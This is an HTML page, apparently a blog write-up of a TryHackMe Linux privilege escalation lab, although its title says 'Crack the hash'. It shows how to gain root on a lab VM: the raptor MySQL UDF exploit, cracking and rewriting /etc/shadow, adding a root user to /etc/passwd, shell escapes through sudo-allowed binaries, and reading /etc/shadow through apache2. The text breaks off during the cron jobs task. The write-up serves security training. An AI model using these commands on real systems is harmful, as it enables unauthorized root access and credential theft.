@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Try Hack Me - crack the hash :: atomloop — TryHackMe, HackTheBox, Vulnhub,  CTF Writeups</title>    
+  
+
+<link rel="canonical" href="https://atomloop.github.io/posts/hashes/" />
+
+
+<link rel="stylesheet" href="https://atomloop.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://atomloop.github.io/style.css">
+
+
+<link rel="shortcut icon" href="https://atomloop.github.io/img/favicon.png">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>
+
+
+
+<a name="top"></a>
+</head>
+
+<body class="dark-theme">
+  
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+<span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+<polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">atomloop | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+<nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    <li><a href="/about">About</a></li>
+    <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+    <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+     <li><a href="/tags/vulnhub/"><img class="icon" src="/vulnhub.ico" width="32" title="vuln hub"></a></li>
+      <li><a href="/archive">Archive</a></li>
+  </ul>
+
+
+
+  <ul class="menu__inner menu__inner--mobile">      
+    <li><a href="/about">About</a></li>       
+    <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+    <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+    <li><a href="/tags/vulnhub/"><img class="icon" src="/vulnhub.ico" width="32" title="vuln hub"></a></li>
+     <li><a href="/archive">Archive</a></li>
+ </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+    </span>
+  </span>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title">Try Hack Me - Crack the hash </h4>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          <i class="fas fa-calendar-week"></i>
+            Tuesday, Aug 18, 2020
+        </span>
+      
+      <span class="post-author">— Written by atomloop</span>
+      
+        <span class="post-read-time">— 11 min read</span>
+
+    
+         <img src="https://atomloop.github.io/image/tryhackme/pentesting/cover.png" class="post-cover center" />
+
+
+         <table>
+          <thead>
+            <tr>
+              <td>Room Name</td>
+              <td>Linux Prev Esc</td>
+            </tr>
+          </thead>
+          <tbody>
+             <tr>
+               <td>Room Type</td>
+               <td> Walkthrow</td>
+             </tr>
+           </tbody>
+           <tbody>
+             <tr>
+               <td>Room Code </td>
+               <td>linuxprevesc</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td>Points </td>
+               <td>--</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td>Dificulty </td>
+               <td>Medium</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td> Room Created by </td>
+               <td><a href="https://tryhackme.com/p/ben">Tib3rev</a></td>
+             </tr>
+           </tbody>
+        </table>
+</div>
+  
+ 
+</style></head><body><article id="6db1591c-bfeb-4930-9d09-924234b511e6" class="page sans"><header><h1 class="page-title">Linux PrivEsc</h1><table class="properties"><tbody><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>Column</th><td>on the waay</td></tr></tbody></table></header><div class="page-body"><p id="1b59c4ac-4334-437a-92aa-32a0d61160b0" class="">Linux PrivEsc</p><p id="78ef85f4-b142-4e4c-b1ac-f8d6c3c7ad1c" class="">lets us see some intro about privilege escalation,Privileges means what a user is permitted to do,Privilege escalation means escalation(gain more permissions) then what privilege is allocated. </p><p id="b031770a-c3bd-4e2a-9ceb-79e0a24dcaec" class="">In  UNIX os every single file and folder stored on the hard drive has a set of permissions associated with it, which says who is allowed to do what with the file.</p><p id="e8281b30-00b7-4095-b3d8-0457573f8d9f" class="">It is just to understand the basic fact that a user can not access (read/write/execute) files that he is not permitted to access. However, the superuser(root) can access all the files which are present on the system. In order to change any important configuration or perform any further attack, first, we need to get root access on any Linux based system.</p><p id="28e69c64-ff41-43da-ae48-ed13a4136dc0" class="">
+</p><p id="f03f9bbf-379c-453c-bc03-ab2cd52e82c2" class="">Why do we need to perform privilege escalation?</p><ul id="9db03dc4-33b1-4471-aab6-acb5a7dcbff7" class="bulleted-list"><li><strong>Read/Write any sensitive file</strong></li></ul><ul id="7836c058-990e-4c95-8e19-a538bbc76236" class="bulleted-list"><li><strong>Persist easily between reboots</strong></li></ul><ul id="ff584a1f-b5c8-4152-a943-ee84e3c5ce01" class="bulleted-list"><li><strong>Insert a permanent backdoor</strong></li></ul><p id="89a55662-0cf7-400a-95a9-44d3149541cf" class="">
+</p><p id="d2183568-16a0-4330-82ac-12b1bec324f2" class="">Privilege escalation  are two types,horizontal and vertical:- </p><p id="8aa41e6c-222d-4452-a0f6-9fa78d7c95fc" class=""><strong>horizontal privilege escalation</strong>  is gaining  access to the user who has same permission has a current user.</p><p id="e88d8502-cdc8-4e5f-99a5-7b1b469c916e" class=""><strong>Vertical privilege escalation</strong> is gaining access to user who has higher privilege then current user. </p><p id="3fa5d3e5-8047-4449-8bab-feb4132ed1ee" class="">
+</p><h3 id="d38b896c-2cac-4d86-84c0-188401a7a842" class=""><mark class="highlight-teal">[Task 1] Deploy the Vulnerable Debian VM</mark></h3><p id="aca31fcf-0a88-4aaf-bf10-c09745d6dfc9" class="">This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. let&#x27;s start with deploying the machine. make sure that you are connected to VPN. you can log in to the target machine using </p><pre id="43c4daf6-3e5f-4060-a472-1690459a0533" class="code"><code>ssh@machine IP 
+password: password321</code></pre><pre id="c6f72538-c940-40ec-951e-dfd12adeeefa" class="code"><code>Atom:~$ ssh user@10.10.186.84
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
+
+user@debian:~$ id
+<del>uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)</del></code></pre><p id="f6eac3c5-8450-4492-93e2-c454b0b618bd" class="block-color-teal">
+</p><h3 id="5c75ab7a-1ba3-4e97-a18c-979b5a89d664" class="block-color-teal">[Task 2] Service Exploits</h3><p id="a2ea9d7e-4c1a-4719-9047-e41aecf0d5c7" class="">Service are simply a program running background on our computer, if Vulnerable Service are running as root, exploiting them can lead to command execution as root . service exploit can be found using Searchsploit, or Linux Smart Enumeration Scripts</p><pre id="fb1e09d8-a811-45f3-a0d3-41ebc5a47206" class="code"><code>LinEnum.sh  linpeas.sh  lse.sh                                                                                                                                                                                 
+user@debian:~/tools/privesc-scripts$ ./lse.sh -l 1                                                                                                                                                                                                                                                                                                                                                                                 
+If you know the current user password, write it here to check sudo privileges: password321                                                                                                                     </code></pre><p id="e2c8a67a-e5f1-4070-b844-3216a2216d4b" class="">we used<code> </code><code><a href="http://lse.sh">lse.sh</a></code><code> </code>script with <code>-l 1</code> flag which means verbosity level 1 </p><p id="88822c69-293b-4c17-bb3b-aca4b93570e5" class="">
+</p><figure id="fcdba8ac-736a-4e46-9701-5cbd50a98cbd" class="image"><a href="Linux%20PrivEsc%20fcdba8ac736a4e4697015cbd50a98cbd/Untitled.png"><img style="width:755px" src="Linux%20PrivEsc%20fcdba8ac736a4e4697015cbd50a98cbd/Untitled.png"/></a></figure><p id="0b1c4ffd-47dc-46d2-9e0f-7b5d83017d76" class="">on the result of the script, you can able to find this phase , means no need root password to connect MySql service . if this service is vulnerable, exploiting them can lead to command execution as root , to  see the version of the running services for Debian <code>dpkg-l </code> or name of the service -v  <code>myqld --version</code>   . with using this information search it on google you will find  <a href="https://www.exploit-db.com/exploits/1518"> exploit code</a>    </p><p id="491bc379-be6a-4b8d-a74d-3bed3e92da29" class="">
+</p><p id="b3f763e8-3518-41d1-8ed0-99a8606ac4e6" class="">under the usage section its clearly mentioned how to exploit .</p><pre id="7e986759-b17d-4479-bf96-91939c5fda53" class="code"><code>Usage:
+ /* $ id
+ * uid=500(raptor) gid=500(raptor) groups=500(raptor)
+ * $ gcc -g -c raptor_udf2.c
+ * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+ * $ mysql -u root -p
+ * Enter password:
+ * [...]
+ * mysql&gt; use mysql;
+ * mysql&gt; create table foo(line blob);
+ * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));
+ * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;
+ * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;
+ * mysql&gt; select * from mysql.func;
+ * +-----------+-----+----------------+----------+
+ * | name      | ret | dl             | type     |
+ * +-----------+-----+----------------+----------+
+ * | do_system |   2 | raptor_udf2.so | function |
+ * +-----------+-----+----------------+----------+
+ * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);
+ * mysql&gt; \! sh
+ * sh-2.05b$ cat /tmp/out
+ * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+ * [...]
+ *
+ * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
+ *
+ */</code></pre><p id="0952043b-b38d-4734-a495-34161d75073d" class="">
+</p><p id="34cf92f8-6ed8-4b84-aa9a-b5d45ed9afcd" class="">MySqL has the ability to install user defined functions(UDF) which run via shared objects. using this features we spawned root shell </p><h3 id="bbfae63a-6407-466d-888f-abb0b2e24313" class=""><mark class="highlight-teal">[Task 3] Weak File Permissions - Readable /etc/shadow</mark></h3><pre id="01789d97-8778-4742-89b9-2b0bbb5d3403" class="code"><code>user@debian:~$ ls -al /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow</code></pre><p id="0ed4961c-bcaf-4b17-939f-91d28a9fa3a8" class="">The /etc/shadow file contains user password hashes and is usually readable only by the root user. but here the user has not a root user. even though he is not a sudo user he can able to view the sudo file, this is a  misconfiguration by a root . this misconfiguration leads the user to gain access to a root shell  by cracking the hashes on the shadow file    </p><pre id="f7330740-b145-4626-89e5-fe89378eb23c" class="code"><code>user@debian:~$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</code></pre><p id="be53d3a7-c336-4d8a-885a-e7d306466c9b" class="">the string between the first colon and the second colon are the hash of the password, let&#x27;s crack it by <strong>hashcat</strong> . to crack the hash from hashcat we need to what type of the hash it is and its mode, we can find it using hash-identifier. if you are not familiar with hash and how to crack it. I&#x27;ve done a <a href="https://atomloop.github.io/posts/crackthehash/">writeup</a> regarding hash. </p><pre id="2ae7e32f-6b95-4617-985b-b17f9edd8e2a" class="code"><code>Atom:~/Downloads$ hashcat -m 1800 -a 0 --show hash.txt rockyou.txt --force
+<del>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:passw#########</del></code></pre><pre id="9e952d44-32bc-46a3-9007-87ae3154bd5f" class="code"><code>Atom $  hashcat -m 1800 -a 0  user.txt /mnt/c/Users/pounr/Documents/rockyou.txt       
+hashcat (v6.0.0) starting...
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:pa#######
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIy...fGxJI0
+Time.Started.....: Mon Sep  7 14:27:25 2020 (2 secs)
+Time.Estimated...: Mon Sep  7 14:27:27 2020 (0 secs)
+Guess.Base.......: File (/mnt/c/Users/pounr/Documents/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     1064 H/s (7.50ms) @ Accel:128 Loops:64 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 2048/14344386 (0.01%)
+Rejected.........: 0/2048 (0.00%)
+Restore.Point....: 1024/14344386 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidates.#1....: bethany -&gt; queen</code></pre><h3 id="4224fe35-d421-4905-96e5-35a579746bd5" class=""><mark class="highlight-teal">[Task 4] Weak File Permissions - Writable /etc/shadow</mark></h3><pre id="07fefd3b-af73-485d-b3a1-2eb1a0180027" class="code"><code>user@debian:~$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</code></pre><p id="fd15ca51-2183-4604-b2a6-5fb97fe06b69" class="">/etc/shadow file on the VM is world-readable writable: which means we can able add or modify hash.  so what we do here is, we know what type , the Linux uses to store the password hash . we have  write permission to the shadow file. so we can generate  our own password hash, and edit  it to etc/shadow file on root user </p><pre id="1d09ea7c-3650-471b-b5d0-3c4c3d6b205a" class="code"><code>Atom $ mkpasswd -m sha-512 owernewpass    
+$6$mjXiOUjX/QxukESZ$mR/xsbddm9OyyG2eLl4IdKFOKEyd6E5/a8FvlaXTaK.fDFL1UiJDaNGp5ua5d221MQoxPXbvEALOwGlwi8Neg1    
+
+
+user@debian:~$ vim /etc/shadow  | grep &#x27;root&#x27;  
+user@debian:~$ su root      
+Password:   
+root@debian:/home/user#</code></pre><p id="e7400a2e-7818-4c15-8d0f-2abe9c8d0351" class="">now we gained root shell with our own password 🤗</p><h3 id="379c2894-8340-46bb-a1b0-4a4da8bfef01" class=""><mark class="highlight-teal">[Task 5] Weak File Permissions - Writable /etc/passwd</mark></h3><p id="2942af6e-f29f-4ab0-a1d4-88926373f981" class="">there are two files don&#x27;t confuse both of the /etc/passwd  file contains information about user accounts. and /etc/shadow file contain the hashes of the users accounts passwords </p><p id="bd4bf0a3-78bf-4095-89a6-81fd94a20754" class="">but  /etc/passwd file have more preference then /etc/shadow  file .  in  some versions of Linux will still allow password hashes to be stored /etc/passwd  . for example   if you store the password hash that you generated for root user to /etc/passwd file . you can get access shell,  no mater what hash in /etc/shadow file  for the user root . the hashes in /etc/passwd file have higher priority  </p><pre id="2a7d56b5-38aa-4f38-9170-393733416aec" class="code"><code>user@debian:~$ ls -l /etc/passwd            
+-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd</code></pre><p id="5046c778-9bae-4139-baf9-23d5cd79b3d0" class="">/etc/passwd file is world-writable. so lets create user and password as our wish and add it to /etc/passwd file  </p><p id="efbd6577-a89c-474e-b9df-d2a3ad579d53" class="">
+</p><pre id="7a73f72c-6222-4334-8609-53c61a387f29" class="code"><code>Atom $ mkpasswd -m SHA-512 owernewpass
+$6$zRULwUHAfiBOkIuq$2BTyvSB3YqmL6uBiArUcFJwvi5QH9qXkXxA3DR8N4xFDvx9p1WfzW9AKLDCS1KiZK4QyqOyEqf6SzZcC63ZYY0</code></pre><p id="43542a8f-4879-457f-b02e-358afa5ff8bd" class="">we just created password hash for newroot user </p><pre id="ceb8d8e4-f403-4735-a82b-d0cfa918d21d" class="code"><code>root:x:0:0:root:/root:/bin/bash
+newroot:$6$zRULwUHAfiBOkIuq$2BTyvSB3YqmL6uBiArUcFJwvi5QH9qXkXxA3DR8N4xFDvx9p1WfzW9AKLDCS1KiZK4QyqOyEqf6SzZcC63ZYY0:0:0:root:/root:/bin/bash  </code></pre><p id="d7871ac4-dcf9-453b-9e7f-a74236a04720" class=""> i just created a new root user  with help of previous root user&#x27;s information . and added hash in the place of x  .  </p><blockquote id="d372c8f4-4541-46be-98ff-496950c0eb8d" class="">note : don&#x27;t paste  newroot user information on top of the /etc/passwd file </blockquote><p id="8e2a9f3f-61fa-4129-9d10-8a88122ddac8" class="">
+</p><h3 id="0ddc30b8-294f-4008-80a2-e36764db8348" class=""><mark class="highlight-teal">[Task 6] Sudo - Shell Escape Sequences</mark></h3><p id="e6de41c4-3c53-4652-a6ef-5e31432ecdd5" class="">
+</p><p id="4a841f0f-d028-46f2-b663-534c6ca93086" class=""><code>sudo -l</code> is a command is used to display the programs which sudo allows your user to run: </p><p id="dbd41c2f-b2da-419c-8fa3-17efed01bbb4" class="">using this tools user dont need roots password, this all tools have options to execute ubuntu commands , if you run a ubuntu commands along with the SUID tools is equal to you are running as a root ..</p><pre id="ccd30019-aa5b-454a-8897-f3aa301e7926" class="code"><code>user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more</code></pre><p id="bcfeb3a8-f7b9-4635-9d73-abb886061fbf" class="">so lets see one by one </p><h3 id="0b7a16fe-54a1-41fc-a9dc-73d3939fd94a" class="">1<strong>.</strong><strong><code>(root) NOPASSWD: /usr/sbin/iftop</code></strong></h3><p id="14447b32-364f-426e-8096-6cea558339f3" class=""><code>iftop </code>  iftop is used to view the current bandwidth on a network interface. It listens to network traffic on a named interface and displays a table of current bandwidth usage by pairs of hosts. iftop must be run by a root user or a user who has sufficient privileges to monitor network bandwidths. </p><pre id="44c868ab-dd35-4413-ab3c-53e3d66c9fa7" class="code"><code>sudo iftop
+!/bin/sh
+
+user@debian:~$ sudo iftop
+interface: eth0
+IP address is: 10.10.214.235
+MAC address is: 02:84:e4:20:85:dd
+sh-4.1#</code></pre><h3 id="002fc6c0-cecf-4bc6-8e22-23846d06ad57" class=""><strong>2.</strong><strong><code>(root) NOPASSWD: /usr/bin/find</code></strong></h3><p id="c97b3952-a89b-4705-87c2-c3132f6b3bca" class=""><code>find</code>  The find command in UNIX is a command line utility for walking a file hierarchy. It can be used to find files and directories and perform subsequent operations on them. It supports searching by file, folder, name, creation date, modification date, owner and permissions. By using the ‘-exec’ other UNIX commands can be executed on files or folders found.</p><pre id="bfe95b64-0f3d-4488-9854-b88334520993" class="code"><code>user@debian:~$ find . -exec /bin/sh \; -quit
+sh-4.1$</code></pre><h3 id="1cf0dcec-c92c-4d17-b2c2-94739dde7074" class=""><code><strong>3.(root) NOPASSWD: /usr/bin/nano</strong></code></h3><p id="15ad7193-4620-4f88-886b-26a3c90e3733" class=""><code>nano</code> nano is a small and friendly text editor. Besides basic text editing, nano offers many extra features like an interactive search and replace, go to line and column number, auto-indentation, feature toggles, internationalization support, and filename tab completion.</p><p id="5eb83628-65b5-4a71-bb4a-593cd99ab2fe" class="">we can execute shell commands also by using <code>ctrl + r and  ctrl  + x </code></p><pre id="d63911bc-435c-4b4e-bcf1-12c9c290c199" class="code"><code>nano
+^R^X
+reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre><h3 id="504706db-461e-406d-920c-7b32620fae32" class=""><strong>4. </strong><strong><code>(root) NOPASSWD: /usr/bin/vim</code></strong></h3><p id="072a816d-e491-4c65-8e4f-d0d561927082" class="">Vim is a highly configurable text editor built to make creating and changing any kind of text very efficient. It is included as &quot;vi&quot; with most UNIX systems and with Apple OS X , it has  lot of features from that  one is command execution feature flag -c is used to execute shell commands on vim  <code> vim -c &#x27;:!/bin/sh&#x27;</code></p><pre id="6aa03353-a5d3-4862-bd6b-6dbab4a294c0" class="code"><code>user@debian:~$ vim -c &#x27;:!/bin/sh&#x27;
+
+sh-4.1$</code></pre><h3 id="3f783746-11b4-45c2-b03a-f9200e040ba1" class=""><code><strong>5.   (root) NOPASSWD: /usr/bin/man</strong></code></h3><p id="bb5b1735-bd80-424a-862b-2b138a064baa" class="">man command in Linux is used to display the user manual of any command that we can run on the terminal. It provides a detailed view of the command which includes NAME, SYNOPSIS, DESCRIPTION, OPTIONS, EXIT STATUS, RETURN VALUES, ERRORS, FILES, VERSIONS, EXAMPLES, AUTHORS and SEE</p><p id="2d9a3c45-dcf0-47cf-bd26-2aac2d0e5799" class="">
+</p><pre id="13714c15-1154-4b65-a708-fed66c1c4c5f" class="code"><code>man man
+!/bin/sh</code></pre><h3 id="f75d00a1-c32e-434b-96bb-07a01c5a8fdc" class=""><strong><code>6. (root) NOPASSWD: /usr/bin/awk</code></strong></h3><p id="71e94bdf-cd61-4936-8a71-d610a1fc7f80" class="">Awk is a scripting language used for manipulating data and generating reports.The awk command programming language requires no compiling, and allows the user to use variables, numeric functions, string functions, and logical operators.</p><pre id="ffa57a70-ffd7-4a10-bc00-d8a87c46c890" class="code"><code>user@debian:~$ awk &#x27;BEGIN {system(&quot;/bin/sh&quot;)}&#x27;
+sh-4.1$</code></pre><h3 id="b33119ce-b95e-4639-95b4-ee99e6dc74aa" class=""><code><strong>7.  (root) NOPASSWD: /usr/bin/less</strong></code></h3><p id="a8a76f70-eb91-454a-a5f1-12d02a231a83" class="">Less is a command line utility that displays the contents of a file or a command output, one page at a time. It is similar to more, but has more advanced features and allows you to navigate both forward and backward through the file.The less command is mostly used for opening large files . we can execute system commands after opened any file </p><pre id="dddc64c1-330f-46ff-84cb-27a15a7eadff" class="code"><code>less /etc/profile
+!/bin/sh</code></pre><h3 id="970e69d3-002c-4ae1-91ad-a007ca8817dd" class="">
+<code><strong> 8.  (root) NOPASSWD: /usr/bin/ftp</strong></code></h3><p id="e564ef11-1bf3-4200-bcc4-f7586d01ae8a" class="">FTP (File Transfer Protocol) is a standard network protocol used to transfer files to and from a remote network.</p><pre id="cdd55b1d-3633-4bae-a0c0-5badc603e643" class="code"><code>ftp
+!/bin/sh</code></pre><h3 id="4b61a2e1-f984-4307-a43a-c8c2dbd78853" class=""><strong><code>9. (root) NOPASSWD: /usr/bin/nmap</code></strong></h3><p id="0bfc3272-9dd8-4dd0-b041-f2a751f33195" class="">Nmap, or Network Mapper, is an open source Linux command line tool for network exploration and security auditing. With Nmap, server administrators can quickly reveal hosts and services, search for security issues, and scan for open ports.</p><pre id="b2bd9bcf-fdec-4c72-91be-67f24cc7a12d" class="code"><code>nmap --interactive
+nmap&gt; !sh</code></pre><h3 id="864fa62b-1edc-4e99-9e83-d63c7baf7203" class=""><code><strong>10.  (root) NOPASSWD: /usr/sbin/apache2</strong></code></h3><p id="dbe0585c-cad3-4b5e-ae39-708b7a9d7c22" class="">we can host information&#x27;s using Apache . -f options is used to specify alternative serverconfig file , if you wrongly specify it will through error using this apache 2 we cont get root shell but we can get sensitive information </p><pre id="3ca86fd9-b73b-4a6f-8050-65fc33863dce" class="code"><code>sudo apache2 -f /etc/shadow</code></pre><p id="10886160-4159-45d6-b4dd-e36bd26fe0f7" class="">output like this </p><pre id="2433cab6-409e-4ba2-8ed9-41b46cddc8b6" class="code"><code>Syntax error on line 1 of /etc/shadow:
+Invalid command &#x27;root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::&#x27;, perhaps misspelled or defined by a module not included in the server configuration</code></pre><p id="379c1f60-ba46-4f0e-a27b-3d1ed25f7e6f" class="">
+</p><p id="9b2f2543-bfdc-4fce-b7ad-d95d6c6059a4" class="">using john the ripper we can able to crack the hash </p><h3 id="f663509b-4777-4df6-aca7-cbdc454717ea" class=""> <code>11. (root) NOPASSWD: /bin/more</code></h3><p id="f345eecf-311b-4203-9aab-26d8d9a75501" class="">more command is used to view the text files in the command prompt, displaying one screen at a time in case the file is large (For example log files) . to exploit this make sure you need to reduce terminal size. </p><pre id="81d9bdf1-e17f-47de-8fbd-6e303b83e8e4" class="code"><code>more /etc/profile
+!/bin/sh</code></pre><h3 id="54c0e043-68a2-4e22-92fe-c8e036e5b196" class=""><mark class="highlight-teal">Task 7 Sudo - Environment Variables</mark></h3><p id="20be1477-5e22-43f4-acf2-adc3a9220020" class="">
+</p><p id="003d15a1-09e6-4e1f-bd67-9fb9a124130c" class=""><strong>LD_PRELOAD</strong> and<strong> LD_LIBRARY_PATH</strong> are both inherited from the user&#x27;s environment. <strong>LD_PRELOAD </strong>loads a shared object before any others when a program is run. <strong>LD_LIBRARY_PATH</strong> provides a list of directories where shared libraries are searched for first.</p><p id="3e3332bc-6bf9-4e46-b5c4-775ae47182c5" class="">it&#x27;s like a c program compilation process, during the compiling process the linker and loader will add object files to the program before generating executable file, in the same way in Linux,if you open any program that has SUID permission.it automatically loads required shared object file, before the program executes, the shared object file contains the implementation of SUID permission. so our goal needs to find which shared object file is preloaded while executing the SUID file,and ware it is located. and finely we need to edit the shared object code to spawn a root shell. first we need to find where the so file is located, on <code>/etc</code> directory <code>/etc/ld.so.conf</code>  contains where the shared library files are located </p><pre id="6bfc9f44-3d5e-49cc-b791-5d3cd6821723" class="code"><code>user@debian:~$ cat /etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+user@debian:~$ ls /etc/ld.so.conf.d/
+libc.conf              x86_64-linux-gnu.conf  
+user@debian:~$ cat /etc/ld.so.conf.d/libc.conf
+# libc default configuration
+/usr/local/lib
+user@debian:~$</code></pre><p id="2a9da355-c1d4-4821-823b-aefe12f71593" class="">
+</p><p id="62e1d768-eeec-441f-8258-669cab574051" class="">
+</p><p id="c0811d4d-d23b-488d-a705-b5bd4c68011e" class="">
+</p><p id="a05f5b91-4571-407e-8ce6-292628d303da" class="">
+</p><p id="0d59d216-9e1c-4683-8914-5b0a2e5f9666" class="">
+</p><p id="9226bbd6-9215-4dd6-8c6e-597b4c79be9f" class="">
+</p><h3 id="cb5ca6a4-5192-4f82-8984-a34502554de5" class=""><mark class="highlight-teal">Task 8 Cron Jobs - File Permissions</mark></h3><p id="9c20db68-8a96-49c7-b5c4-93ef778e7e1b" class="">
+</p><p id="34f7b24d-ae7b-4423-a7b0-47058ba107f1" class="">
+</p><p id="17f71901-6031-4bd2-8b18-8d79f44646c2" class="">Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at<code> /etc/crontab.</code></p><p id="d1d9261a-2ba7-4490-ace2-ea7c2f7e9ebc" class="">View the contents of the system-wide crontab:</p><p id="dbc06cb8-200a-486a-8560-5945dffe1da9" class=""><code>cat /etc/crontab</code></p><pre id="3e3361c7-aa07-4323-94f7-4bc5443bca9f" class="code"><code>SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
